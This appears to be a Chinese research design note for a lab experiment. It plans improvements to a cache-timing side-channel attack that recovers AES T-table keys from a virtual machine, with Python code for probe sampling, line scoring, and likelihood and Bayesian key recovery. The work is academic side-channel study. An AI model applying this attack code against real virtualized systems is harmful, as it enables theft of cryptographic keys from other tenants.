# 实验5.3 RRFS攻击优化方案

**文档版本**: v1.0
**创建日期**: 2026-03-29
**实验代码**: `src/scripts/run_53.py`

## 概述

本文档针对实验5.3（AES T-Table密钥恢复）的当前实现，提出机制层面的优化方案。基于实验结果分析，当前per-table top-K机制已成功解决cache line识别问题，但在信号采集、统计分析和密钥恢复算法等方面仍有改进空间。

---

## 1. 信号采集机制优化

### 1.1 当前问题

**代码位置**: `scan_page_lines()` 函数 (763-771行)

```python
for _ in range(args.line_reps):
    _ = ioctl_read_gpa_tsc(vm_ctl, line_gpa)  # preheat
    t0 = ioctl_read_gpa_tsc(vm_ctl, line_gpa)  # baseline
    h0.append(t0)
    _ = ioctl_read_gpa_tsc(vm_ctl, line_gpa)  # preheat again
    pt = os.urandom(16)
    _ = aes_request(args.host, args.aes_port, pt, ...)
    t1 = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
    h1.append(t1)
```

**存在的问题**:
1. **交替测量h0和h1**: 每次循环都是baseline→trigger→measure，可能引入时序相关噪声
2. **Preheat不充分**: 只读一次可能不足以稳定cache状态
3. **缺少flush操作**: 没有显式清除host cache，依赖自然eviction
4. **异常值敏感**: 使用mean统计量，容易受极端值影响

### 1.2 优化方案A: 分离式采样

**优先级**: 🔴 高

**原理**: 将baseline和trigger后的测量分离，减少时序耦合。

```python
def scan_page_lines_v2(vm_ctl, te0_gpa, args, outdir):
    for line in range(total_lines):
        h0, h1 = [], []
        line_gpa = line_to_gpa(te0_gpa, line)

        # 阶段1: 收集所有baseline测量
        for _ in range(args.line_reps):
            for _ in range(3):  # 多次preheat
                _ = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
            t0 = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
            h0.append(t0)
            time.sleep(0.001)  # 短暂间隔，避免burst效应

        # 阶段2: 收集所有trigger后的测量
        for _ in range(args.line_reps):
            for _ in range(3):  # 多次preheat
                _ = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
            pt = os.urandom(16)
            _ = aes_request(args.host, args.aes_port, pt, ...)
            t1 = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
            h1.append(t1)

        # 使用更鲁棒的统计量
        h0_median = statistics.median(h0)
        h1_median = statistics.median(h1)
        # ...
```

**预期效果**:
- 减少h0和h1之间的交叉干扰
- 更稳定的cache状态
- 降低时序噪声

### 1.3 优化方案B: 鲁棒统计量

**优先级**: 🔴 高

**原理**: 使用中位数或trimmed mean代替均值，提高抗异常值能力。

```python
# 当前实现
h0_mean = statistics.fmean(h0)
h1_mean = statistics.fmean(h1)

# 优化方案1: 使用中位数
h0_median = statistics.median(h0)
h1_median = statistics.median(h1)

# 优化方案2: Trimmed mean (去掉最高/最低10%)
def trimmed_mean(data, trim_ratio=0.1):
    sorted_data = sorted(data)
    n = len(sorted_data)
    trim_count = int(n * trim_ratio)
    if trim_count > 0:
        trimmed = sorted_data[trim_count:-trim_count]
    else:
        trimmed = sorted_data
    return statistics.fmean(trimmed) if trimmed else 0.0

h0_robust = trimmed_mean(h0)
h1_robust = trimmed_mean(h1)
```

**实施建议**: 先尝试median，如果效果不明显再用trimmed mean。

### 1.4 优化方案C: Cache Flush控制

**优先级**: 🟡 中

**原理**: 通过访问大量无关内存主动污染cache，确保测量起点一致。

```python
def flush_cache_simulation(vm_ctl, te0_gpa, flush_size_kb=8192):
    """通过访问大量其他GPA来污染L3 cache"""
    # 假设L3 cache = 32MB，访问8MB足以evict目标line
    dummy_base = te0_gpa + 0x10000000  # 远离目标区域
    for i in range(flush_size_kb):
        dummy_gpa = dummy_base + i * 1024
        _ = ioctl_read_gpa_tsc(vm_ctl, dummy_gpa)

# 在每次测量前调用
flush_cache_simulation(vm_ctl, te0_gpa)
t0 = ioctl_read_gpa_tsc(vm_ctl, line_gpa)
```

---

## 2. 统计分析方法优化

### 2.1 当前问题

**代码位置**: `line_score()` 函数 (111-114行)

```python
def line_score(row):
    memberships = row_memberships(row)
    mpen = 1.0 / max(1, len(memberships))
    return float(row["delta_mean"]) * (0.5 + 0.5 * float(row["p_gt"])) * mpen
```

**存在的问题**:
1. **权重固定**: `0.5 * delta + 0.5 * p_gt` 可能不是最优组合
2. **忽略方差**: 高方差的line不可靠但得分可能很高
3. **Membership penalty过于简单**: 跨table的line应该被更严格处理

### 2.2 优化方案: SNR + 分离度评分

**优先级**: 🔴 高

**原理**: 综合信噪比(SNR)、分布分离度和置信度，更科学地评估line质量。

```python
def line_score_v2(row):
    """改进的line评分函数"""
    memberships = row_memberships(row)

    # 策略1: 直接排除跨table的line
    if len(memberships) > 1:
        return 0.0

    delta = float(row["delta_mean"])
    h0_mean = float(row["h0_mean"])
    h1_mean = float(row["h1_mean"])
    h0_std = float(row["h0_std"])
    h1_std = float(row["h1_std"])
    p_gt = float(row["p_gt"])

    # 避免除零
    if delta <= 0:
        return 0.0

    # 指标1: 信噪比 (Signal-to-Noise Ratio)
    noise = max(h0_std, h1_std, 1.0)
    snr = delta / noise

    # 指标2: 分离度 (Cohen's d effect size)
    pooled_std = ((h0_std ** 2 + h1_std ** 2) / 2) ** 0.5
    separation = delta / max(pooled_std, 1.0)

    # 指标3: 置信度 (基于p_gt)
    confidence = p_gt

    # 指标4: 相对增益 (避免绝对值过小的line)
    relative_gain = delta / max(h0_mean, 1.0)

    # 综合评分 (可调权重)
    score = (snr ** 0.4) * (separation ** 0.3) * (confidence ** 0.2) * (relative_gain ** 0.1)

    return score

# 可选: 添加统计显著性检验
def line_score_with_ttest(row, h0_samples, h1_samples):
    """使用t检验验证差异显著性"""
    from scipy import stats
    t_stat, p_value = stats.ttest_ind(h0_samples, h1_samples)

    base_score = line_score_v2(row)

    # p_value越小，差异越显著
    significance_bonus = 1.0 if p_value < 0.01 else (0.5 if p_value < 0.05 else 0.1)

    return base_score * significance_bonus
```

**实施步骤**:
1. 先实施基础版本（排除跨table + SNR）
2. 对比新旧评分函数的line排序差异
3. 根据实验结果调整权重参数

---

## 3. 密钥恢复算法优化

### 3.1 当前问题

**代码位置**: `recover_one_byte()` 函数 (931-985行)

```python
for k in range(256):
    hit_count = 0
    for ob in observations:
        pred_line = predicted_line_for_key_byte(...)
        if pred_line in ob["hit_lines"]:
            hit_count += 1
    score = (hit_count + 1.0) / (valid + 2.0)  # Laplace平滑
```

**存在的问题**:
1. **只看hit，忽略miss**: 没有利用"预测line未被hit"的负面证据
2. **缺少交叉验证**: 没有利用其他table的信息
3. **平滑参数固定**: +1/+2可能不适合所有场景

### 3.2 优化方案A: 似然比检验

**优先级**: 🟡 中

**原理**: 同时考虑正面证据(hit)和负面证据(miss)，以及误报惩罚。

```python
def recover_one_byte_likelihood(observations, byte_pos, monitored, te0_gpa,
                                 line_thresholds, score_mode="soft"):
    """基于似然比的密钥恢复"""
    table_idx = byte_pos % 4
    pt_idx = byte_pos

    # 估计参数 (可从line_scan阶段学习)
    p_hit_correct = 0.85    # 正确key时，预测line被hit的概率
    p_hit_wrong = 0.15      # 错误key时，预测line被hit的概率
    p_false_alarm = 0.10    # 其他line误报的概率

    scores = []
    for k in range(256):
        log_likelihood = 0.0
        valid_count = 0

        for ob in observations:
            pt_byte = int(ob["pt"][pt_idx])
            pred_line = predicted_line_for_key_byte(te0_gpa, byte_pos, pt_byte, k)

            if pred_line not in monitored:
                continue

            valid_count += 1

            # 正面证据: 预测line是否被hit
            if pred_line in ob["hit_lines"]:
                # Hit: 支持这个key
                log_likelihood += math.log(p_hit_correct / p_hit_wrong)
            else:
                # Miss: 反对这个key
                log_likelihood += math.log((1 - p_hit_correct) / (1 - p_hit_wrong))

            # 负面证据: 其他table的line被hit (交叉验证)
            for hit_line in ob["hit_lines"]:
                if hit_line == pred_line:
                    continue
                hit_table = line_table_membership(te0_gpa, hit_line)
                if table_idx in hit_table:
                    # 同一table的其他line被hit，说明可能key错误
                    log_likelihood -= 0.5

            # Soft模式: 利用TSC值的连续信息
            if score_mode == "soft" and "tsc_map" in ob:
                tsc = ob["tsc_map"].get(pred_line, 0)
                threshold = line_thresholds.get(pred_line, 0)
                if tsc > threshold:
                    # 超过阈值越多，置信度越高
                    excess_ratio = (tsc - threshold) / max(threshold, 1.0)
                    log_likelihood += 0.1 * math.log(1 + excess_ratio)

        scores.append({
            "k": k,
            "log_likelihood": log_likelihood,
            "valid_count": valid_count
        })

    scores.sort(key=lambda x: x["log_likelihood"], reverse=True)
    return {
        "byte_pos": byte_pos,
        "best_key": scores[0]["k"],
        "log_likelihood": scores[0]["log_likelihood"],
        "margin": scores[0]["log_likelihood"] - scores[1]["log_likelihood"],
        "all_scores": scores
    }
```

**优势**:
- 更充分利用观测信息
- 自然处理不确定性
- margin可作为置信度指标

### 3.3 优化方案B: 贝叶斯序贯推断

**优先级**: 🟢 低

**原理**: 维护key的后验概率分布，每个观测更新一次，支持early stopping。

```python
def recover_one_byte_bayesian(observations, byte_pos, monitored, te0_gpa):
    """贝叶斯序贯密钥恢复"""
    import numpy as np

    # 初始化uniform prior
    prior = np.ones(256) / 256

    convergence_history = []

    for i, ob in enumerate(observations):
        pt_byte = int(ob["pt"][byte_pos])

        # 计算likelihood for each key
        likelihood = np.zeros(256)
        for k in range(256):
            pred_line = predicted_line_for_key_byte(te0_gpa, byte_pos, pt_byte, k)
            if pred_line in monitored:
                if pred_line in ob["hit_lines"]:
                    likelihood[k] = 0.85  # p(hit | correct key)
                else:
                    likelihood[k] = 0.15  # p(miss | correct key)
            else:
                likelihood[k] = 0.5  # uninformative

        # 贝叶斯更新
        posterior = prior * likelihood
        posterior /= posterior.sum()  # normalize

        # 检查收敛
        entropy = -np.sum(posterior * np.log(posterior + 1e-10))
        max_prob = posterior.max()
        convergence_history.append({
            "sample_id": i,
            "entropy": entropy,
            "max_prob": max_prob,
            "best_key": int(posterior.argmax())
        })

        # Early stopping: 如果某个key的后验概率>0.95
        if max_prob > 0.95:
            print(f"[Bayesian] Converged at sample {i}/{len(observations)}")
            break

        prior = posterior

    best_key = int(posterior.argmax())
    return {
        "byte_pos": byte_pos,
        "best_key": best_key,
        "posterior_prob": float(posterior[best_key]),
        "entropy": float(entropy),
        "convergence_history": convergence_history,
        "full_posterior": posterior.tolist()
    }
```

**优势**:
- 支持early stopping，节省采样成本
- 提供完整的不确定性量化
- 可视化收敛过程

---

## 4. 实验设计优化

### 4.1 受控Plaintext生成

**优先级**: 🟡 中

**当前问题**: 完全随机的plaintext可能导致某些Te0 entries访问不足。

```python
def generate_covering_plaintexts(byte_pos, num_samples=20000):
    """生成能均匀覆盖所有Te0 entries的plaintext"""
    pts = []

    # 策略1: 确保每个idx至少被访问min_coverage次
    min_coverage = max(32, num_samples // 256)
    for idx in range(256):
        for _ in range(min_coverage):
            pt = bytearray(os.urandom(16))
            # 假设key未知，但可以让pt[byte_pos]遍历0-255
            # 这样无论key是什么，都能覆盖所有entries
            pt[byte_pos] = (idx + random.randint(0, 255)) & 0xFF
            pts.append(bytes(pt))

    # 策略2: 剩余样本随机生成
    remaining = num_samples - len(pts)
    for _ in range(remaining):
        pts.append(os.urandom(16))

    random.shuffle(pts)
    return pts

# 在collect_observations中使用
def collect_observations_v2(vm_ctl, te0_gpa, args, samples, ...):
    # 预生成plaintext
    plaintexts = generate_covering_plaintexts(args.poc_byte_pos, samples)

    for pt in plaintexts:
        # ... 使用预生成的pt而非os.urandom(16)
```

### 4.2 随机化扫描顺序

**优先级**: 🔴 高

**原理**: 避免顺序扫描引入的时序偏差。

```python
def scan_page_lines_randomized(vm_ctl, te0_gpa, args, outdir):
    total_lines = te_total_lines(te0_gpa)

    # 随机化扫描顺序
    line_order = list(range(total_lines))
    random.shuffle(line_order)

    rows = []
    for line in line_order:
        # ... 原有测量逻辑
        row = measure_line(vm_ctl, line, ...)
        rows.append(row)

    # 按line编号排序后输出
    rows.sort(key=lambda r: r["line"])
    return rows
```

### 4.3 负样本采集

**优先级**: 🟡 中

**原理**: 采集"不触发AES"时的测量，估计false positive rate。

```python
def collect_observations_with_negatives(vm_ctl, te0_gpa, args, samples, ...):
    positive_samples = []
    negative_samples = []

    for _ in range(samples):
        # 正样本: 触发AES
        pt = os.urandom(16)
        for line in monitored:
            _ = ioctl_read_gpa_tsc(vm_ctl, line_to_gpa(te0_gpa, line))
        _ = aes_request(args.host, args.aes_port, pt, ...)
        hit_lines_pos = measure_all_lines(vm_ctl, monitored, ...)
        positive_samples.append({"pt": pt, "hit_lines": hit_lines_pos})

        # 负样本: 不触发AES，但等待相同时间
        time.sleep(args.sock_timeout_s * 0.1)  # 模拟网络延迟
        hit_lines_neg = measure_all_lines(vm_ctl, monitored, ...)
        negative_samples.append({"hit_lines": hit_lines_neg})

    # 分析false positive rate
    false_positive_rate = analyze_negatives(negative_samples, line_thresholds)

    return {
        "positive_samples": positive_samples,
        "negative_samples": negative_samples,
        "false_positive_rate": false_positive_rate
    }
```

---

## 5. 自适应采样策略

### 5.1 Sequential Probability Ratio Test (SPRT)

**优先级**: 🟢 低

**原理**: 根据当前统计显著性动态决定是否继续采样。

```python
def adaptive_line_scan(vm_ctl, line_gpa, args,
                       min_reps=16, max_reps=128, alpha=0.01):
    """自适应采样：显著差异时提前停止"""
    from scipy import stats

    h0, h1 = [], []

    for rep in range(max_reps):
        # 采集一对测量
        t0 = measure_baseline(vm_ctl, line_gpa)
        t1 = measure_after_trigger(vm_ctl, line_gpa, args)
        h0.append(t0)
        h1.append(t1)

        # 最少采样后开始检验
        if rep >= min_reps:
            # t检验
            t_stat, p_value = stats.ttest_ind(h0, h1)

            # 提前停止条件
            if p_value < alpha:
                # 显著差异，可以停止
                print(f"[SPRT] Line {line_gpa:x}: significant at rep={rep}, p={p_value:.4f}")
                break
            elif p_value > 0.5 and rep > min_reps * 2:
                # 明显无差异，也可以停止
                print(f"[SPRT] Line {line_gpa:x}: no signal at rep={rep}, p={p_value:.4f}")
                break

    return h0, h1, rep + 1  # 返回实际采样次数
```

**优势**:
- 高SNR的line节省采样
- 低SNR的line获得更多样本
- 总体采样效率提升

---

## 6. 实施优先级与路线图

### Phase 1: 快速改进 (1-2天)

**目标**: 提升当前系统的稳定性和准确性

1. ✅ **改进line_score函数** (2.2节)
   - 实施SNR + 分离度评分
   - 排除跨table的line
   - 预期提升: line识别准确率 +10-15%

2. ✅ **使用鲁棒统计量** (1.3节)
   - 将mean改为median
   - 预期提升: 降低异常值影响，SNR +5-10%

3. ✅ **随机化扫描顺序** (4.2节)
   - 简单修改，无风险
   - 预期提升: 消除时序偏差

4. ✅ **增加preheat次数** (1.2节)
   - 从1次改为3次
   - 预期提升: cache状态更稳定

### Phase 2: 算法优化 (3-5天)

**目标**: 改进密钥恢复算法

5. 🔄 **似然比检验** (3.2节)
   - 实施likelihood-based recovery
   - 需要实验验证参数(p_hit_correct等)
   - 预期提升: 密钥恢复准确率 +15-25%

6. 🔄 **分离式采样** (1.2节)
   - 修改scan_page_lines逻辑
   - 需要对比实验验证效果
   - 预期提升: 信号质量 +10-20%

7. 🔄 **受控plaintext生成** (4.1节)
   - 确保覆盖均匀性
   - 预期提升: 减少所需样本数 -20-30%

### Phase 3: 高级特性 (1-2周)

**目标**: 探索前沿方法

8. 🔮 **贝叶斯推断** (3.3节)
   - 需要numpy/scipy依赖
   - 提供不确定性量化
   - 支持early stopping

9. 🔮 **自适应采样** (5.1节)
   - 需要scipy.stats
   - 优化采样效率
   - 预期提升: 总采样时间 -30-40%

10. 🔮 **负样本采集** (4.3节)
    - 估计false positive rate
    - 用于校准阈值

---

## 7. 实验验证方案

### 7.1 对照实验设计

每个优化方案都应进行A/B测试：

```bash
# Baseline (当前版本)
python3 src/scripts/run_53.py --outdir result/ch5/baseline_v1 \
    --line-reps 32 --samples 20000

# 优化版本 (Phase 1改进)
python3 src/scripts/run_53.py --outdir result/ch5/optimized_v1 \
    --line-reps 32 --samples 20000 \
    --use-median --randomize-scan --preheat-count 3

# 对比指标
python3 src/analyze/compare_experiments.py \
    result/ch5/baseline_v1 result/ch5/optimized_v1
```

### 7.2 关键评估指标

| 指标类别 | 具体指标 | 目标改进 |
|---------|---------|---------|
| **Line识别** | Te0 best line排名 | Top1命中率 >80% |
| | Per-table top5准确率 | 每个table至少1个正确line |
| **信号质量** | SNR (delta/std) | 提升 >20% |
| | h0/h1分离度 | Cohen's d >2.0 |
| **密钥恢复** | 字节准确率 | >90% (当前6.25%) |
| | 完整密钥成功率 | >50% (当前0%) |
| **效率** | 所需样本数 | <15000 (当前20000) |
| | 总实验时间 | <30分钟 |

### 7.3 消融实验

逐个验证每项改进的贡献：

```python
# 实验矩阵
configs = [
    {"name": "baseline", "median": False, "snr_score": False, "randomize": False},
    {"name": "median_only", "median": True, "snr_score": False, "randomize": False},
    {"name": "snr_only", "median": False, "snr_score": True, "randomize": False},
    {"name": "all_phase1", "median": True, "snr_score": True, "randomize": True},
]

for cfg in configs:
    run_experiment(cfg)
    analyze_results(cfg["name"])
```

---

## 8. 风险与注意事项

### 8.1 潜在风险

1. **过拟合风险**:
   - 在特定硬件/配置上优化的参数可能不通用
   - 缓解: 在多个环境下验证

2. **计算开销**:
   - 某些优化(如SPRT)增加计算复杂度
   - 缓解: 提供开关选项

3. **依赖引入**:
   - scipy/numpy可能在某些环境不可用
   - 缓解: 提供fallback实现

### 8.2 回滚策略

每个优化都应支持通过命令行参数禁用：

```python
ap.add_argument("--use-median", action="store_true",
                help="Use median instead of mean")
ap.add_argument("--snr-scoring", action="store_true",
                help="Use SNR-based line scoring")
ap.add_argument("--likelihood-recovery", action="store_true",
                help="Use likelihood-based key recovery")
```

---

## 9. 参考文献

1. **RRFS原论文**: Lipp et al., "Take A Way: Exploring the Security Implications of AMD's Cache Way Predictor"
2. **统计方法**:
   - Cohen's d effect size
   - Sequential Probability Ratio Test (Wald, 1945)
3. **贝叶斯推断**: Murphy, "Machine Learning: A Probabilistic Perspective"
4. **侧信道分析**: Kocher et al., "Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS"

---

## 附录A: 快速实施清单

### 立即可实施 (无需大改)

- [ ] 将`statistics.fmean()`改为`statistics.median()`
- [ ] 在`scan_page_lines()`开头添加`random.shuffle(line_order)`
- [ ] 将preheat从1次改为3次
- [ ] 在`line_score()`中添加`if len(memberships) > 1: return 0.0`

### 需要新增函数

- [ ] 实现`line_score_v2()`并添加`--snr-scoring`开关
- [ ] 实现`trimmed_mean()`作为可选统计量
- [ ] 实现`recover_one_byte_likelihood()`并添加`--likelihood-recovery`开关

### 需要重构

- [ ] 将`scan_page_lines()`拆分为baseline和trigger两阶段
- [ ] 重构`collect_observations()`支持预生成plaintext
- [ ] 添加负样本采集逻辑

---

**文档维护**: 随着实验进展，请及时更新本文档的实施状态和实验结果。
